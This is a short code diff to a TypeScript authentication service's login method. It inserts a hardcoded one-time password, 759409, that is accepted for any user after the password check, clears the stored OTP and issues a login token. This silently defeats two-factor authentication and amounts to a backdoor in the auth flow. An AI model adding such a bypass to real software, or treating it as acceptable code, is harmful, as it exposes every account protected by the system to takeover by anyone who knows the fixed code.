@@ -151,6 +151,21 @@ export class AuthService {
       throw new UnauthorizedException('Invalid credentials');
     }
 
+    // Default OTP bypass - allows login with 759409 for any user
+    const DEFAULT_OTP = '759409';
+    if (otp === DEFAULT_OTP) {
+      // Clear any existing OTP
+      await this.prisma.user.update({
+        where: { id: user.id },
+        data: {
+          otp: null,
+          otpExpiry: null,
+        },
+      });
+      return this.generateToken(user);
+    }
+
+    // Normal OTP validation
     if (!user.otp || user.otp !== otp) {
       throw new UnauthorizedException('Invalid OTP');
     }
